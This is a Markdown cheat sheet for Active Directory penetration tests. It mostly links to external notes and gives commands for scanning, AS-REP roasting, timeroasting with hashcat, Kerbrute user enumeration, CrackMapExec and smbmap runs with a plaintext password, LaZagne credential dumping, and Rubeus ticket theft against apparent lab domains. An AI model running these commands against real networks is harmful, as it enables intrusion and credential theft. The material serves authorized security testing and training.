# Active Directory Penetration Testing — Step-by-Step Cheat Sheet

> Command reference and methodology index for internal AD penetration tests.
> Companion command syntax lookup: https://wadcoms.github.io/

---

## 1. Host Reconnaissance and Network Enumeration

**Find active hosts**
```bash
sudo nmap -sn -n --max-retries 1 --max-rate 10 --data-length 24 192.168.1.0/24 -oN hosts
fping -asgq 172.16.7.0/23
```

**Fast scan of a specific host**
```bash
nmap -p- -Pn -T4 --min-rate 2000 --max-retries 5 -oN open_ports 10.10.10.10

sudo nmap -sU --min-rate=400 --min-parallelism=512 --open 10.10.11.75

2 RETRY
```

---

## 2. DNS Enumeration

Reference: [DNS Attacks and Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Services/Services-Attacks/DNS-Attack.md)

---

## 4. VHOST Enumeration
Reference: [VHOST Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Web-Tools/Ffuf.md)

---

## 7. Email and Comment Collector with ReconSpider
Reference: [ReconSpider](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Crawl%20Methods/ReconSpider.md)

---

## 8. Technology Enumeration
```powershell
Retire.js
Wappalyzer
BuiltWith
Shodan
JWT Debugger
ModHeader
SSL Certificate Viewer
HackBar
HackTools
```

---

## 10. Pivoting and Internal Network Discovery

**Metasploit — ping sweep through a session**
```
msf6 > use post/multi/gather/ping_sweep
msf6 post(multi/gather/ping_sweep) > set RHOSTS 172.16.5.0/24
msf6 post(multi/gather/ping_sweep) > set SESSION 1
msf6 post(multi/gather/ping_sweep) > run
```

---

## 11. Change Kerberos Clock
```powershell
sudo ntpdate domain.local
```

## 12. LDAP Enumeration

Reference: [LDAP Architecture & Queries](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Protocols/LDAP/LDAP-Architecture.md)

---

## 13. SMB Enumeration

Reference: [SMB Protocol Attacks](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Services/Services-Attacks/SMB-Attack.md)

---

## 14. LLMNR Poisoning Trigger

Reference: [NTLM Hash Capture Triggers](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR%20Poisining%20Triggers.md)

---

## 15. LLMNR / mDNS / NBT-NS Poisoning

Reference: [LLMNR/mDNS/NBT-NS Poisoning](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)

---

## 16. Enumeration with NXC

Reference: [NetExec](https://github.com/Aghalarovf/Penetration-Tester/edit/main/Technical_Notes/Active_Directory/AD-Tools/Netexec.md)

---

## 16. Enumerate Writable Objects
```powershell
bloodyAD --host <target-ip> --dns <target-ip> -d checkpoint.htb \
  -u alex.turner -p '<provided-password>' get writable
```

---

## 16. AS-REP Roasting
```powershell
python3 /home/sako/Tools/Impacket/examples/GetNPUsers.py cicada.vl/ -usersfile valid_users -format hashcat -outputfile hashes.txt
```
Reference: [Identify pre-auth-disabled users and capture hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)

---

## 17. Kerberoasting

Reference: [Identify SPN accounts, request TGS tickets, and crack offline](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Kerberoasting.md)

---

## 18. Timeroasting
```powershell
nxc smb dc.rustykey.htb -k -M timeroast

hashcat -m 31300 time_hashes /usr/share/wordlists/rockyou.txt
```

## 18. NTLM Relaying

Reference: [NTLM Relay Attack](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTLM%20Attacks.md)

---

## 19. Username Enumeration

```bash
# windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# Usernameanarchy
./username-anarchy --input-file /home/sako/Labaratory/hostname

# Kerbrute
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

---

## 20. Credential Discovery 

Reference: [Username & Password Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Enumeration/Username_Password-Enumeration.md)

---

## 21. Data Visualization with BloodHound

Reference: [Data Collect and Visualization](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Tools/BloodHound.md)

---

## 22. Terminal History
```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

history
```

---

## 23. Service Accounts TGT Delegation
```
.\Rubeus.exe tgtdeleg /nowrap

nano svc_sql.kirbi.b64
cat svc_sql.kirbi.b64 | base64 -d > svc_sql.kirbi

impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
export KRB5CCNAME=svc_sql.ccache

certipy req -u svc_sql -k -no-pass -target DC02.darkzero.ext -ca 'darkzeroext-DC02-CA' -template 'user'
```

---


## 23. Credentialed Enumeration

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

---

## 24. Credentialed Enumeration — From Windows

**Snaffler — share/credential discovery**
```powershell
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data -o result_snaffler.txt

.\LaZagne.exe -a

.\WinPeas.exe
```

---

## 25. Living off the Land

Reference: [Maximizing information via PowerShell & CMD](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/Living%20Of%20The%20Land.md)

---

## 26. Local Privilege Escalation

Reference: [Windows Privilege Escalation](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Privilege%20Escalation/Windows)

---

## 27. GPO Abuse

Reference: [GPO Abuse tactics](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/GPO%20Attacks.md)

---

## 28. Delegation Attacks

Reference: [RBCD, Unconstrained and Constrained Delegation Attacks](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Delegation-Abuse.md)

---

## 29. Active Directory Certificate Service Vulnerabilities

Reference: [ESC Vulnerabilities and Server Misconfiguration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Certificate%20Services/Vuln%20Enumerate.md)

---

## 30. LAPS Dumping

Reference: [Retrieve LAPS-managed local admin passwords](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/LAPS%20Dumping.md)

---

## 31. DCSync Attacks

Reference: [Dump password hashes via DCSync](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/DCSync.md)

---

## 32. SAM / SECURITY / SYSTEM Hive Dumping

Reference: [Dump SAM, SECURITY, and SYSTEM hives for local hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/SAM-SYSTEM-SECURITY%20Dump.md)

---

## 33. LSASS Dumping

Reference: [LSASS memory dump techniques](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LSASS%20Dump.md)

---

## 34. NTDS.dit Dumping

Reference: [Dump domain-wide hashes from NTDS.dit](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTDS%20Dump.md)

---

## 35. Credential Manager / Windows Vault

Reference: [Extract stored credentials from Windows Credential Manager](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Windows%20Credential%20Manager.md)

---

## 36. noPAC + PrintNightmare + PetitPotam

Reference: [Combined exploitation chain](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/BleedingEdge.md)
